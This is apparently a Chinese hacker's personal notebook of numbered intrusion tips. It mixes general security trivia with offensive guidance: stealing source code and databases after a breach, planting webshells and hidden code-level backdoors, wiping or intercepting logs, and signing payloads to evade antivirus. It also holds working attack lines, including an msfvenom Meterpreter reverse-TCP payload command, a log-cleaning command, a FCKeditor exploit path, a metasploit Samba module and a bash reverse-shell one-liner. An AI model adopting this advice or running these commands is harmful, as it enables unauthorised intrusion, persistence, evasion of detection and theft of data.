顶级黑客手中掌握的社工库数量超过10亿条。数据量可以作为一种衡量标准。
国外上公开的EXP代码网站：  结果黑客工具以及漏洞利用代码EXP可能是病毒，有人就遇到过EXP是格式化自己磁盘的。
	Epxloit-db
	SercurityFocus
	Searchsploit
	1.脚本小子与黑客的区别并不是对攻击的追求，而在于对目标的追求。如果出现一个漏洞之后第一时间想到的是拿下附近的网络而不是研究一下，如果想要的只是肉鸡的数量而不是信息的质量和价值（我追求信息的完整性，但是并不是什么都要，比如成绩）。
	2.农行登录的时候要求关闭浏览器其他界面，难道是防止跨站？
	3. autorun.inf是当打开它所在的盘时,就自动运行的小程序.比如我们把MTV光盘放入光驱的时候,有时候就会自动开始播放了
	4.CTF比赛每一轮尽可能日完更多的人。日下来，第一时间种后门和抓鸡，然后检测文件改动。。
	5.安全问题的根源：人会犯错。尤其分层导致的各个人的片面工作，
	6.注册表可以用来完成开机启动的地方非常多。
	7.概念验证Proof of concept（POC）：对想法的不完整实现从而证明其可行性。常用来用作0day、exploit的别名（通常指没有充分利用漏洞的expolit）
	8.临时邮箱：https://link.zhihu.com/?target=http%3A//10minutemail.com/10MinuteMail/index.html（从知乎的跳转）
	9.左老师的摄像头项目告诉我：一个程序，出于简单开发的考虑，可能十分简单。要想读取摄像头的媒体数据只需要一个连接就好。所以以后端口扫描程序可以都去尝试一下，并分析回流。
	10.
windows  telnet：
控制面板-》程序和功能-》打开或关闭windows功能-》Telnet服务端、Telnet客户端。如果打开成功就能使用telnet命令了。
telnet服务器还需要在services.msc中开启服务。在这里配置好登录账户，你需要把账户加到自动创建的TelnetClients组里面：
	0.默认设置是可以直接启动服务的。其实相当于账户是NT AUTHORITY\LocalService，密码为空的配置。（这是个虚拟账户，名字叫做“本地服务”）
	1.我设置为本地系统账户结果就说“错误13：数据无效”而不能启动服务，可能是因为我的系统账户没有密码
	2.然后我就是使用另外一个“此账户”，指定计算机上面的账户，要求账户名字与密码都是本机，否则就“错误1069：由于登录失败而无法启动服务”
	3.我使guest（开头的字母可以不用大写）active，并且设置密码，然后配置telnet，遇到“错误1297：服务账户配置中不存在服务正常运行所需的特权”。这时候应该设置secpol.msc（Local Security Settings MMC）在里面设置账户权限。然而发现我的win10与win7因为是HOME版本C盘windows目录下的system32目录下里面都没有gpedit.msc组策略和secpol.msc安全组。lusrmgr.msc打开来会说此版本不能使用。
	4.要是觉得自己配置错误了，可以在“打开或者关闭windows功能”中重新安装telnet服务。
	“此账户”配置：
	此账户：.\telnet 这是指定使用叫做telnet的账户
	密码：xxxx 确认密码：xxxx  我密码只输入了5位，但是它自己补成了好几位，还不允许C-C，估计是防止特殊工具的查看。
	5.最终解决，使将账户加入到TelnetClients，然后使用虚拟账户或者说默认配置本地服务就好了，之后就可以连接了。但是我把Administrator这个账户也加进去，却不能使用这个账户进行登录。
微软给telnet使用的认证是NTLM认证。
	登录演示：（和mssql类似，登陆三次失败就断开连接）
	root@kali:~# telnet 192.168.1.133 #telnet IP/域名 port
	Trying 192.168.1.133...
	root@kali:~# telnet www.hellovega.cn 80 #通过不同的显示用于端口检查
	Trying 58.216.107.101...
	Connected to 212.tc.sp.cdntip.com.
	Escape character is '^]'.
	telnet: Unable to connect to remote host: Connection timed out
	root@kali:~# telnet 192.168.1.133
	Trying 192.168.1.133...
	Connected to 192.168.1.133.
	Escape character is '^]'.
	Welcome to Microsoft Telnet Service 

	login: 
	
	
	
linux telnet：
你可以判断当前运行的操作系统版本，多数UNIX系统都会在连接时报告这类消息
	6.一旦发生中美严重对抗，美国很容易攻击 Intel inside 的设备，却很难攻击“龙芯 inside”的设备和系统。CPU 和内存控制器在内的所有的模块都是自主设计的。入侵的底层其实已经实现了。
	7.Rapid7一家全球领先的安全风险信息解决方案提供商
	8.autorun.inf
 
[autorun]
open=template.pdf 这是一个有渗透的pdf
icon=autorun.ico

YUMI制作的U盘autorun.inf内容：
[AutoRun.Amd64]
open=setup.exe
icon=setup.exe,0

[AutoRun]
open=sources\SetupError.exe x64
icon=sources\SetupError.exe,0


OSX：AutoUnattend.xml
	9.中国铁路的自动售票机器是winodws XP系统，可以调出来，而且我见到过有人执行了cmd，并且使用了虚拟键盘。
	10.qq只有直接传文件和图片，是采用点到点。所以这样就可以获取别人的ip。如果是文本消息直接加密走服务器。因为通信量大，腾讯现在只读取特征码。文件要看大小和传输类型 过不过服务器。直接通过端口查看就好。任务管理器，性能，资源监控器，勾选QQ的全部进程，观察网络页签。
Tim不适用（张小龙团队解决了不少qq的马化腾团队的弊端），只有标准版QQ才适合。TIM还是有方法的，提到了篡改包头。

QQ加载带网页图片的xml时客户端会直接从网页获取该图片，不会经过腾讯的服务器，这个时候可以抓到ip并进行定位
	11.有的摄像头在开启时灯会亮
	12.SLMail is SMTP and POP3 email server software for Microsoft Windows NT and 2000.
	13.FTP远程管理程序的配置文件很吸引人。你帮他换成有exp的版本...嘿嘿
Serv-U、ProFTPd （伪装Linux ProFTPD服务器 Windows下的FTP服务多是Serv-U）
VNC、PCAnyWhere
Radmin（从前安装的时候都是将密码写入HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter）

	14.webshell有菜刀配合，所以有的人拿到shell就转成webshell使用，但是这样是容易暴露的，shell肯定可以写出配合工具。
	15.网站编辑器是管理员的工具，但是常常因为漏洞（比如说直接访问）
FCKeditor 早期版本存在漏洞：FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors
上传以后的文件默认在/jsp或asp或aspx或cfm/connector

CuteEditor、EWebEditor（默认情况下这编辑器数据库可以被下载，默认账号密码admin）
	16.在用小马上传文件之前先试着创建一个文件夹来试探一下。
	17.有名气的模板：
Dvbbs
动网
Discuz!
WordPress
	18.总被说起mdb数据库名字里面带了#会导致无法下载？浏览器不行吗，那下载器也不行吗。不过有一个解决办法是在下载路径中将#改为%23.
	19.逗逼管理员，像存放上传图片的目录根本不需要脚本执行权限。
	20.很多服务器是放在虚拟服务上面的。
	21.服务器权限：
2003的IUSER不能访问exe（那时候在C:\Windows\system32\CMD.exe），处理办法就是自己上传一个cmd.exe
	22.马名字：
systemcontrol
newasp
后进去以后再根据已有文件命名来改
	用户名：
iis_helper
	23.网站入侵以后：
注意一些应用的密码ssh、SQL、管理员后台登录
一般第一时间拖走源码（方便之后入侵）和数据库
检查其他shell，收入武器库

尝试恢复从前的漏洞，我是指降级？和改动代码来制造漏洞。
	24.服务器环境有多种，那么jsp shell不行就换php shell。
	25.渗透不了网站就渗透ISP提供商。胆大心细。
	26.敏感文件：
apache:/etc/httpd/conf/httpd.conf
	27.asp能不能被下载和会不会经过解析是不相关的事情。
	28.下载快乐星球歌曲的时候由于过快，导致我没能看到网速变化。
	29.手机卡停机以后，充值以后，需要重开数据开关才能收到信号。
	30.使用vi编辑文本文件会产生一个交换文件，这个文件没准可以直接通过web进行下载。
	31.知道文件备份以后也是种维持站点控制的途径。
	32.windows源码发生过泄露：
微软会将自己的源代码给政府，传闻曾经给过俄罗斯政府，希望借此提升微软产品在俄罗斯公家机关的销售量。
2004年的Windows 2000源代码、Windows NT 4.0源代码

2017年尚未公开发布的绝密Windows 10和Windows Server 2016版本，以及已经公开发布的数个Windows版本代码泄露，泄漏在BetaArchive 网站（这网站经常有windows的内部测试安装版本），代码主要提供给产商。The folder itself was 1.2GB in size, contained 12 releases each being 100MB：
>PnP code
Who would want the Windows behaviour of having to install the driver for a device all over again if you plug it in a different port?
>USB stack
See above
>Wi-Fi stack
Windows' built-in Wifi stack is so bad that people usually have to install Intel's as replacement
>storage drivers
See above. Except this time people would install Intel's AHCI/RAID controller drivers even if they aren't using Intel chipsets
>ARM-specific OneCore kernel code
LOL
只找到类似于代码文件树的存在https://pastebin.com/raw/VGEbWVSM，没能找到代码
	33.通过电脑向QQ空间发出网址，然后就会自动转化为腾讯的http://url.cn/4B291Mt 。
	34.firefox中的flash插件不太稳定啊，很容易造成浏览器卡死。
	35.如果get提交实在无法绕过，可以尝试改变攻击方式。如；post注入、寻找子站、旁站……等
	36.如果tomcat将php文件视为简单的文本文件，那么如果一台服务器上有多款服务器软件，那么通过不同的端口进行访问，就能进行原代码的下载。
	37.iis自带FTP
	38.一般人们只检查TCP协议上的端口开启情况，你或许可以以UDP的方式来返回一个shell，延长被发现的时间。
	39.zmap-40分钟扫完全世界IP。带宽足够的话。
	40.审核变成了对上传照片中的手持身份证上数字的识别，我估计还会判断下是否有人脸
	41.正常来说，所有脚本类型都能弹回来，跟本地环境有关，php的是直接创造sock，挂在php进程里，asp的是靠写入二进制文件到tmp下再exec(容易被avkill掉)，aspx是.net创建sock，jar也是直接寄存于父进程也就是java里，psh是寄存在自身powershell线程里的，py、pl、rb都是挂在解析器进程里的，vb是写入二进制再执行类似于asp，cmd也是同理asp
	42.毫无戒心的用户，打开一个rar包，对这个rar进行解析的时候就可能已经中招了。
	43.runtime process infection（运行时过程感染）   最常见的手段就是dll注入
	44.日志清理工具：
	使用日志清理库Liblogclean
		logclean-ng  -w /var/log/wtmp -u w00t -r root 删除掉who日志中的w00t用户有关日志，保留root有关日志
	但是更高级的方式并不是怎么更干净地清理，而是通过比如ptrace()系统调用（用于调试和追踪进程，可以使得一个进程控制另外一个进程），在日志写入之前就拦截。写日志的进程/usr/sbin/rsyslogd（之前叫做syslogd）。
	NAT转换日志记得清理。
	45.APT攻击中“持续的”是指有一个长远的目标
	
	46.容易让人关闭的网页：
	一个一直在“Wait Please…..Loading”
	看小说经常会弹出来的游戏、广告、xx诱惑界面
	47.cain的Decoders-》LSA secrets―》local system 能直接触发“一分钟后关闭windows”，并且没有办法进行阻止。
	48.cd “.. "这名字看起来挺吓唬人的
	49.针对信息协议的攻击：
	当黑客视图连接防护墙后面不可访问的计算机A的时候，会被防火墙阻止。但是传闻在请求报文中，设置IP地址源路径，使得报文的某一个目的地指向的防火墙，但是最终的地质指向的是计算机A。这时候就不会被拦截。并经过防火墙发送到了内部网络。
	50.ICMP重定向攻击实现MITM：
	通过ICMP重定向消息，将连接重定向到一个不安全的计算机，从中实现MITM攻击。ettercap可以实现。
	51.热键漏洞：
	在windows注销的时候，但是热键服务还是开着的， 所以之前就有一种按5下Shift键，就能直接进入远程桌面。
	书上介绍了一种替换exe的方法，将轻松访问里面的“朗读屏幕内容（讲述人）”对应的Narrator.exe替换成相同目录中的cmd.eex或者自己的shell。本想说这时候进入程序就能通过net user xxx xx /add ，但是想起来权限不够。所以在替换exe的时候应该使用自己的程序，返回一个提权的exe。
	52.建议可以将可执行文件的图标改成QQ的快捷方式。
	53.木马与病毒应该有自我恢复的能力。本地备份或者像现在的云病毒一样，直接从云端现在病毒的实体。
	54.因为CHM文件是html文件组成的，所以可以其中加入木马网页。反编译出一个hhp文件（总管理文件）和html文件夹。使用QuickCHM插入我们木马网页。《黑客攻防 从入门到精通》中介绍的，在html文件中添加了一行html来执行同目录下的可执行文件。
<object width=0””” height=”0” sytle=”display:none” codebase=”xxx.exe”>
	55.跨平台可能更倾向于同样硬件架构的不同软件环境。可移植性，更倾向于强调硬件，比如 java可以运行在 x86机器上，同样的程序拿到64位机器上一样使用。现今的跨平台实现方法主要有两种，一种是“一次编译，到处运行”（就是java这种），还有一种是“一次编码，到处编译”（但是不能使用系统api），QT、cocos2d-x等等。他们都是做了一个系统平台无关的层。所以实现跨平台病毒还是java这种方法好一点。Windows、Linux、Unix目前都已经遵循了POSIX接口规范，这就使得他们中大部分的常用接口都是近似的，所以在跨平台框架里，这大部分的代码是可以共用的。不过我想通用指令集（CPU指定）一定跨平台。
https://securelist.com/crossplatform-virus-the-latest-proof-of-concept/30157/ 跨平台的汇编病毒
	56.通过扬声器和麦克风传输数据已经在一些应用中使用了，比如支付宝钱包。但由于普通麦克风在20KHz以上会有很大的衰减，所以使用的频率一般在15~19KHz之间。在这么低频的载波上是很难实现高速率的传输的，考虑功率和误码率等因素，估计在1米左右距离上实际传输速率不会超过500 bit/s。

只要能表示出一个数据编码方式就能够传播。
	57.Bi.a 病毒是之前使用汇编编写的，能够同时感染Windows 或Linux 计算机的POC病毒。
	58.日志这种东西，不要以为操作没有什么就不需要清除了。即便是建立一个匿名连接，都是要清除日志的。任何东西基本都是要记录日志的。目前知道的默认情况下，半连接不会被web服务器记录日志。
	59.存在一对多的远程控制。
	60.文件加过壳会被杀毒软件重点监控，但是文件保护会被多数杀毒扫描引擎忽略。如果你想保证你的payload能起到作用，可以购买一个证书，然后用SDK中的signtool.exe给你的软件加上签名，这样会使得你的程序更加可信。
	61.即便是添加信任以后，如果触发了检测还是会被阻止以及提醒。
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.182 lport=4443 -f msi -o /tmp/test.msi
	62.Vmware虚拟机中的wireshark可以直接抓到同样桥接以及主机中的发出与返回包。
	63.ICMP攻击：
	针对连接的DoS攻击
	　　针对连接的DoS攻击，可以终止现有的网络连接。针对网络连接的DoS攻击会影响所有的IP设备，因为它使用了合法的ICMP消息。Nuke通过发送一个伪造的ICMP Destination Unreachable或Redirect消息来终止合法的网络连接。更具恶意的攻击，如puke和smack，会给某一个范围内的端口发送大量的数据包，毁掉大量的网络连接，同时还会消耗受害主机CPU的时钟周期。
	　　还有一些攻击使用ICMP Source Quench消息，导致网络流量变慢，甚至停止。Redirect和Router Announcement消息被利用来强制受害主机使用一个并不存在的路由器，或者把数据包路由到攻击者的机器，进行攻击。针对连接的DoS攻击不能通过打补丁的方式加以解决，通过过滤适当的ICMP消息类型，一般防火墙可以阻止此类攻击。
	基于重定向(redirect)的路由欺骗技术  但是windows的第一条路由器是开着的
	　　首先我们应该知道，微软的Windows98和NT系统都保持着一张已知的路由器列表，列表中位于第一项的路由器是默认路由器，如果默认路由器关闭，则位于列表第二项的路由器成为缺省路由器。缺省路由向发送者报告另一条到特定主机的更短路由，就是ICMP重定向。
	63.Port stealing：
	该技术主要用于局域网中间人攻击中，尤其路由器采用静态ARP后，导致ARP欺骗无效。背景知识：路由器为了方便转发数据包，会在内部记录每个接口和Mac地址的对应关系。例如，当计算机A通过网线向路由器发送了一个数据包，路由器会自动将该计算机Mac地址和网线所连接的接口B进行绑定。如果路由器收到要转发给A的数据包，就会将该包从接口B发出。A就可以顺利接受到数据包。这样，路由器就避免广播发包，同时其他计算机也无法获取A的数据包。技术实现：其他电脑C可以伪造计算机A的Mac地址进行发包，让路由器进行错误的绑定。这样发给A的包，就被发给C了。接受到数据包后，C再发送一个请求A的ARP包，A响应后，路由器重新绑定正确的A。最后，C把数据包转发给A。缺点：在ARP请求和恢复过程中，可能会造成C无法获取A的部分数据包。Ettercap已经实现Por Stealing技术。
	64.DHCP Spoof：
	由于dhcp服务没有认证过程，任何dhcp服务器都能为网络上的机器提供服务。实际上就是几个服务器竞争看谁反应快客户端就使用谁，这为中间人攻击提供了可能。ettercap中提供了此项功能，可以用scapy搭建一个dhcp服务器，用twisted建立一个DNS服务器：sudo twistd -n dns --recursive --cache。
	65.NDP poison：  Neighbor Discovery Protocol 
	NDP用来发现直接相连的邻居信息，包括邻接设备的设备名称、软/硬件版本、连接端口等，另外还可提供设备的ID、端口地址、硬件平台等信息。ARP replaced by NDP in IPv6。ettercap提供此项功能。
	66.网站自己弄出了系统漏洞，但是这种漏洞很容易被漏洞扫描器扫描出来然后修补，建议在代码逻辑中挖一个确保只有自己知道的洞。目前只知道端口敲击这种防御方法。
	67.产商喜欢收集信息，所以攻击掉产商的数据库，能够获取的有着很大的价值。
	68.在车上按照预定的路线移动，并不断连接上面的AP，从而保证ip的变化。
	69.一旦检测到开启360安全卫士，就搞一点事情，让它背锅。用户就会退出程序。
	70.如果可以登录目标系统，那就可以扫出很多个问题。通过端口转发将扫描的包发送到目标主机，这样就会造成大量的流量，小心IDS。有时候本地安装一个也无所谓。
	71.windows 通过echo 指令可以自己编写出一个可以执行的vbs脚本，通过cscript执行。在win7之前vbs是windows上的主要脚本语言，在win7开始变成了powershell。那么病毒的编写应该要向这个编写平台转变。
PsExec   一种支持远程执行某一个程序的工具。
	72.三大杀毒软件存严重漏洞，杀软可变黑客工具（2015年，出现原因：杀毒软件在一个可预测的地址中分配了用于读、写和执行权限的内存）
	记得宾浩宇和我讲过，有一位人曾经通过发送qq窗口抖动就能够直接黑下来。
	73.samba，当配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。
smbclient -L //192.168.99.131 进行登录，需要password
metasploit use auxiliary/admin/smb/samba_symlink_traversal 
	74.数据库web管理软件的登录密码一般即数据库密码。
	75.windows登陆另外的一个账户，但是qq的密码还是被保存着，这说明qq并没有将密码数据存储在C盘提供的数据文件夹中。
	76.美国政府最早建立漏洞库NVD，非常的全面。后来将各种漏洞用于战略。
	77.要想IE运行一个要了很多权限的Java Applet
需要在IE中设置 安全站点
需要在控制面板-》Java-》安全站点中增加指定的站点（这里的站点需要加上端口号）
	78.ATM上安装针孔摄像头、键盘记录、卡信息新复制器。
	79.手机攻击：
手机漏洞
伪基站
SIM复制攻击，打电话只能够一方接收，发短信估计也是这样。
DOS（中文名：阻断攻击）
	80.摆渡攻击：摆渡攻击是一种专门针对移动存储设备，从与互联网物理隔离的内部网络中窃取文件资料的信息攻击手段。 最常见的就是U盘摆渡。
	81.信息安全可以分为三个方面：
技术安全类
   采用具有一定安全性的硬件、软件来实现对计算机系统及其所存数据的安全保护。
管理安全类
    软硬件意外故障，场地的意外事故，计算机设备和数据介质的物理破坏、丢失等安全问题。
政策法律类
    政府部门建立的有关计算机犯罪、数据安全保密的法律道德准则和政策法规、法令。
	82.数据库的安全：用户<->DBMS<->OS<->具体数据
	83.编写程序的时候如果想要隐藏重要的接口，可以使用代理的思想，让程序访问自己的后台界面，这样通过自己设置的后台界面进行数据中转。别人通过wireshark分析到的也只是这一个代理接口，只有在拿下服务器以后才能看到真正的接口在哪里。但是如果他们想要的只是数据，那么这种代理做法返回能让别有用心的人利用起来，来一波栽赃嫁祸。
	84.邮件炸弹攻击：1、恐怖分子邮寄炸弹；2、一切破坏电子邮箱的办法，比如发送大量垃圾邮件
	85.数据驱动攻击是通过向某个活动中的服务发送数据，以产生非正常结果来进行的攻击。
	86.证书可信（保证CA公钥真实）：
RA(注册)系统负责对用户的申请资料进行审核以决定是否，CA（认证）只对RA通过审核的用户颁发证书。
PKI 中证书的信用是一级一级背书的，最顶级的证书是预装到系统里的，里面的机构要么要么非常有钱，要么就是「你敢和老子作对老子就炸死你」――放心他做得到……
PGP 使用信任网络来保证 key 的可靠性，大致思路是：我朋友的朋友的朋友…………是 XXX，整个信任链条都没问题，因此他是可信的。
	87.自动网络渗透测试PRT
	88.在渗透测试过程中，没准一个错误就会导致应用程序的DOS。
	89.文本类协议需要注意转义字符的存在，比如SMTP、SSH。
	90.隐晦安全：一种效率低下的计算机安全手段，通过对系统运转细节（协议、算法和内部系统）的保密来达到防范目的。隐晦安全假定可信任成员组以外的人不能接近系统，因此这种安全并不可靠。
	91.隧道技术(Tunneling)是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送。常见的有ss隧道，dns隧道。
	92.http://jackson.thuraisamy.me/runtime-exec-payloads.html
反弹shell有时候会因为管道符号被过滤等，所以需要进行一次编码，从而反弹成功:bash -i >& /de/tcp/x.x.x.x/port_number 0>&1 
